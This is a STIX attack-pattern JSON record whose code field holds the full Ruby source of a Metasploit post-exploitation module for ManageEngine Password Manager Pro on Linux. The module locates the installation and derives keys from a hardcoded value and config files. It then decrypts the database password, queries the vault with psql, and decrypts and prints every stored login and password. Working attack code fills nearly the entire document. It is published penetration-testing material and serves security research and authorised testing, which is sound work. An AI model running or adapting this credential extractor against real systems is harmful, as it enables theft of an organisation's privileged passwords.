{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--189d852f-af57-4e44-8469-2e7c7e18a26a",
    "created": "2024-08-14T16:33:17.984849Z",
    "modified": "2024-08-14T16:33:17.984853Z",
    "name": "Linux Gather ManageEngine Password Manager Pro Password Extractor",
    "description": " This module gathers the encrypted passwords stored by Password Manager Pro and decrypt them using key materials stored in multiple configuration files.  'License' => MSF_LICENSE 'Platform' => ['unix', 'linux'] 'SessionTypes' => ['shell', 'meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/manageengine_password_manager_creds.rb",
            "external_id": "manageengine_password_manager_creds.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustedsec.com/blog/the-curious-case-of-the-password-database/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/trustedsec/Zoinks/blob/main/zoinks.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::File\n  include Msf::Post::Process\n\n  HARDCODED_KEY = '7n3tP'.freeze\n  SERVICE_DIR = '/etc/init.d'.freeze\n  PMP_SERVICE = 'pmp-service'.freeze\n  DB_CONF_PATH = 'conf/database_params.conf'.freeze\n  MANAGE_KEY_CONF_PATH = 'conf/manage_key.conf'.freeze\n  SALT = (1..8).map(&:chr).join.freeze\n  ITERATIONS = 1024\n\n  ResourceCredential = Struct.new(:resource_name, :resource_url, :account_notes, :login_name, :password)\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather ManageEngine Password Manager Pro Password Extractor',\n        'Description' => %q{\n          This module gathers the encrypted passwords stored by Password Manager\n          Pro and decrypt them using key materials stored in multiple\n          configuration files.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Author' => [\n          'Travis Kaun', # Original Research and PoC\n          'Rob Simon', # Original Research and PoC\n          'Charles Yost', # Original Research and PoC\n          'Christophe De La Fuente' # MSF module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.trustedsec.com/blog/the-curious-case-of-the-password-database/' ],\n          [ 'URL', 'https://github.com/trustedsec/Zoinks/blob/main/zoinks.py' ]\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ],\n          'Reliability' => [ ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('INSTALL_PATH', [false, 'The Password Manager Pro installation path. The module will try to auto detect it if not set.']),\n      OptAddress.new('PG_HOST', [false, 'The PostgreSQL host', '127.0.0.1']),\n      OptPort.new('PG_PORT', [false, 'The PostgreSQL port', 2345])\n    ])\n  end\n\n  def detect_process\n    # PMP usually starts two processes from its own installation path: `java` and `postgres`.\n    # These processes are shipped with the standard installation package and are used by default.\n    vprint_status('Trying to detect path from the PMP related processes')\n\n    paths_to_check = [\n      '/jre/bin/java',\n      '/pgsql/bin/postgres'\n    ]\n\n    paths_to_check.each do |path|\n      found_path = shell_get_processes&.find do |process|\n        process['name'] =~ /pmp.*#{path}/i\n      end\n      return found_path['name'].split(path).first if found_path\n    end\n    vprint_error('Cannot detect the installation path from the PMP processes')\n\n    nil\n  end\n\n  def detect_service\n    # Check if PMP is installed as a service. The default Linux installer\n    # just create a symlink to the `pmp-service` service script in `/etc/init.d/`.\n    vprint_status('Trying to detect path from the PMP service')\n\n    pmp_service_path = \"#{SERVICE_DIR}/#{PMP_SERVICE}\"\n\n    begin\n      pmp_file = stat(pmp_service_path)\n    rescue StandardError => e\n      vprint_error(\"Error when reading `#{pmp_service_path}`: #{e}\")\n      return\n    end\n    unless pmp_file\n      vprint_error(\"PMP service script `#{pmp_service_path}` not found\")\n      return\n    end\n\n    unless pmp_file.symlink?\n      vprint_error(\"`#{pmp_service_path}` is not a symlink and the installation path cannot be detected\")\n      return\n    end\n\n    begin\n      cmd = \"readlink -f '#{pmp_service_path}'\"\n      pmp_service_real = cmd_exec(cmd)\n    rescue StandardError => e\n      vprint_error(\"Error when executing `#{cmd}`: #{e}\")\n      return\n    end\n    unless pmp_service_real\n      vprint_error(\"Cannot resolve the symlink #{pmp_service_path}\")\n    end\n\n    install_dir = pmp_service_real.split('/')\n    if install_dir.pop(2) == ['bin', PMP_SERVICE]\n      return install_dir.join('/')\n    end\n\n    vprint_error(\"Cannot detect the installation path from the resolved symlink `#{pmp_service_real}`\")\n\n    nil\n  end\n\n  def detect_install_path\n    vprint_status('Detecting installation path')\n    detect_service || detect_process\n  end\n\n  def decrypt_text(b64_ciphertext, enc_key)\n    raw_ciphertext = Rex::Text.decode_base64(b64_ciphertext)\n\n    cipher = OpenSSL::Cipher.new('AES-256-CTR')\n    cipher.decrypt\n    cipher.iv = raw_ciphertext[0, 16]\n\n    digest = OpenSSL::Digest.new('SHA1')\n    key = OpenSSL::PKCS5.pbkdf2_hmac(enc_key, SALT, ITERATIONS, cipher.key_len, digest)\n    cipher.key = key\n\n    decrypted = cipher.update(raw_ciphertext[16..])\n    decrypted << cipher.final\n  end\n\n  def get_db_password(install_path, enc_key)\n    vprint_status('Getting the database password')\n\n    db_path = \"#{install_path}/#{DB_CONF_PATH}\"\n\n    begin\n      db_conf = read_file(db_path)\n    rescue StandardError => e\n      print_error(\"Error reading `#{db_path}`: #{e}\")\n      return\n    end\n    unless db_conf\n      print_error(\"Database configuration file `#{db_path}` not found\")\n      return\n    end\n\n    b64_password = db_conf.match(/password=(.+)$/)&.captures&.first\n    unless b64_password\n      print_error('Unable to retrieve the database password')\n      return\n    end\n\n    decrypt_text(b64_password, enc_key)\n  end\n\n  def get_db_enc_key(install_path)\n    vprint_status('Getting the database encryption key')\n\n    manage_key_conf_path = \"#{install_path}/#{MANAGE_KEY_CONF_PATH}\"\n    begin\n      pmp_key_path = read_file(manage_key_conf_path)\n    rescue StandardError => e\n      print_error(\"Error reading `#{manage_key_conf_path}`: #{e}\")\n      return\n    end\n    unless pmp_key_path\n      print_error(\"Database manage_key configuration file `#{manage_key_conf_path}` not found\")\n      return\n    end\n    unless exist?(pmp_key_path)\n      print_error(\"Database key configuration file `#{pmp_key_path}` not found\")\n      return\n    end\n    vprint_good(\"Found the database key configuration: #{pmp_key_path}\")\n\n    begin\n      pmp_key = read_file(pmp_key_path)\n    rescue StandardError => e\n      print_error(\"Error reading `#{pmp_key_path}`: #{e}\")\n      return\n    end\n    unless pmp_key\n      print_error(\"Database key configuration file #{pmp_key_path} not found\")\n      return\n    end\n\n    pmp_key.match(/ENCRYPTIONKEY=(.+)$/)&.captures&.first\n  end\n\n  def pg_host\n    @pg_host ||= datastore['PG_HOST'].blank? ? '127.0.0.1' : datastore['PG_HOST']\n  end\n\n  def pg_port\n    @pg_port ||= datastore['PG_PORT'].blank? ? 2345 : datastore['PG_PORT']\n  end\n\n  def psql_path(install_path)\n    return @psql_path if @psql_path\n\n    psql = \"#{install_path}/pgsql/bin/psql\"\n    raise Rex::RuntimeError, \"Cannot find `pgsql` in the installation path `#{psql}`\" unless exist?(psql)\n\n    @psql_path = psql\n  end\n\n  def query_db(query, install_path, db_password)\n    cmd = \"env PGPASSWORD=#{db_password} #{psql_path(install_path)} -w -A -t -h #{pg_host} -p #{pg_port} -U pmpuser -d PassTrix -c \"\n    cmd << \"\\\"#{query}\\\"\"\n    dlog(\"psql command: #{cmd}\")\n\n    result, success = cmd_exec_with_result(cmd)\n    raise Rex::RuntimeError, \"psql returned an error: #{result}\" unless success\n\n    result\n  end\n\n  def process_key(key)\n    key = key.ljust(32)\n    key = Rex::Text.decode_base64(key) if key.length > 32\n\n    # This mimics how Java handles: new String(aeskey, 'UTF-8').toCharArray()\n    key.force_encoding('utf-8').scrub.b\n  end\n\n  def get_notesdescription(install_path, db_password, db_enc_key)\n    begin\n      cmd = 'SELECT notesdescription FROM Ptrx_NotesInfo'\n      b64_notesdescription = query_db(cmd, install_path, db_password)\n    rescue StandardError => e\n      print_error(\"Error while querying `Ptrx_NotesInfo` table with `psql`: #{e}\")\n      return\n    end\n\n    enc_key = process_key(db_enc_key)\n    decrypt_text(b64_notesdescription, enc_key)\n  end\n\n  def dump_credentials(install_path, db_password, db_enc_key, notesdescription)\n    begin\n      cmd = \"SELECT ptrx_resource.RESOURCENAME,\n                    ptrx_resource.RESOURCEURL,\n                    ptrx_password.DESCRIPTION,\n                    ptrx_account.LOGINNAME,\n                    decryptschar(ptrx_passbasedauthen.PASSWORD,\\'#{notesdescription}\\')\n             FROM ptrx_passbasedauthen\n             LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID\n             LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID\n             LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID\"\n      passwords = query_db(cmd, install_path, db_password)\n    rescue StandardError => e\n      print_error(\"Error while dumping credentials with `psql`: #{e}\")\n      return\n    end\n\n    enc_key = process_key(db_enc_key)\n    passwords.each_line.map do |password|\n      r_name, r_url, desc, name, pass = password.strip.split('|')\n      decrypted_password = decrypt_text(pass, enc_key)\n      ResourceCredential.new(r_name, r_url, desc, name, decrypted_password)\n    end\n  end\n\n  def report_creds(username, password)\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: fullname,\n      private_data: password,\n      private_type: :password,\n      session_id: session_db_id,\n      username: username,\n      workspace_id: myworkspace_id\n    }\n    create_credential(credential_data)\n  rescue StandardError => e\n    vprint_error(\"Error reporting credentials `#{username}:#{password}`: #{e}\")\n    elog(e)\n  end\n\n  def display_and_report(resource_credentials)\n    cred_tbl = Rex::Text::Table.new({\n      'Header' => 'Password Manager Pro Credentials',\n      'Indent' => 1,\n      'Columns' => ['Resource Name', 'Resource URL', 'Account Notes', 'Login Name', 'Password']\n    })\n\n    resource_credentials.each do |res_cred|\n      report_creds(res_cred.login_name, res_cred.password)\n\n      cred_tbl << [\n        res_cred.resource_name,\n        res_cred.resource_url,\n        res_cred.account_notes,\n        res_cred.login_name,\n        res_cred.password\n      ]\n    end\n\n    print_line(cred_tbl.to_s)\n  end\n\n  def run\n    install_path = datastore['INSTALL_PATH'].blank? ? detect_install_path : datastore['INSTALL_PATH']\n    unless install_path\n      fail_with(Failure::BadConfig,\n                'Unable to detect the PMP installation path. Use the INSTALL_PATH option instead.')\n    end\n    print_status(\"Installation path: #{install_path}\")\n\n    encryption_key = Digest::MD5.new.update(HARDCODED_KEY).hexdigest\n\n    db_password = get_db_password(install_path, encryption_key)\n    unless db_password\n      fail_with(Failure::Unknown, 'Unable to get the database password')\n    end\n    print_good(\"Database password: #{db_password}\")\n\n    db_enc_key = get_db_enc_key(install_path)\n    unless db_enc_key\n      fail_with(Failure::Unknown, 'Unable to get the database encryption key')\n    end\n    print_good(\"Database encryption key: #{db_enc_key}\")\n\n    notesdescription = get_notesdescription(install_path, db_password, db_enc_key)\n    unless notesdescription\n      fail_with(Failure::Unknown, 'Unable to get `notesdescription` from the database')\n    end\n    print_good(\"`notesdescription` field value: #{notesdescription}\")\n\n    resource_credentials = dump_credentials(install_path, db_password, db_enc_key, notesdescription)\n    unless resource_credentials\n      fail_with(Failure::Unknown, 'No credentials found in the database')\n    end\n\n    display_and_report(resource_credentials)\n  end\nend\n"
}